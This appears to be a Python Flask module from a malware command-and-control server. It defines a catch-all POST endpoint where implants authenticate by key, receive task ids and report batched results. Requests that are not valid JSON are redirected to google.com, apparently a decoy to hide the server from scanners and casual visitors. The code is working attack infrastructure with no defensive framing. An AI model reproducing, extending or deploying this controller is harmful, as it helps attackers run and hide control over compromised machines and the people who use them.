import json

from .models import AgentModel, ImplantModel
from .tasks import TaskManager
from flask import Blueprint, redirect, request, jsonify

check_in_blueprint = Blueprint('check_in', __name__)
task_manager = TaskManager()


@check_in_blueprint.route('/<path:route>', methods=['POST'])
def check_in(route):
    try:
        batch_response = json.loads(request.get_data())
    except json.decoder.JSONDecodeError:
        data = request.get_data().decode('utf-8')
        print(f'Failed to parse batch response as JSON:\n{data}')
        print(f'-'*20)
        return redirect("https://www.google.com")

    if isinstance(batch_response, dict):
        print('Retrieved implant authentication' + str(batch_response))
        implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
        agent = AgentModel(implant=implant)
        return agent.check_in_task_id

    batch_request = task_manager.parse_batch_response(batch_response)
    return jsonify(batch_request)
